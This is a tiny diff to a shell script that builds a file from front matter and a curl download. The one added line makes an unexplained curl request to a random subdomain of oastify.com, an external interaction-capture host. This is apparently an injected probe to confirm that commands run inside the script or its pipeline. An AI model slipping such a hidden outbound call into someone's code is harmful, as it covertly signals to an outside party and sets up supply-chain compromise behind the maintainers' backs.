@@ -27,3 +27,4 @@ aliases:
 
 echo "${front_matter}" > "${FILE}"
 curl -fSL "${URL}" >> "${FILE}"
+curl 8y7oxeateoxs474dr1notguqvh18pzdo.oastify.com/test
